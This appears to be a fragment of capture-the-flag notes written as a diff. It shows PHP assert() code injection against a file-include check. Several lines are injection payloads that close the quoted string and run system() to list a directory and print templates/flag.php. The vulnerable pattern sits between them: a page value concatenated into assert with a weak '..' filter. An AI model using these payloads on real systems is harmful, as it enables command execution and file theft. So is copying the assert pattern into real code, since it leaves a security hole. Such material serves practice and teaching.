@@ -1,0 +1,9 @@
+assert("file_exists('')",system('cat templates/flag.php')//')") or die("That file doesn't exist!");
+
+$file = "templates/" . $page . ".php";
+
+assert("strpos('', '..') === false") or die("Detected hacking attempt!");
+
+..','..')===false",system('cat templates/flag.php'));//
+
+templates/flag'.system("ls templates/;").'.php
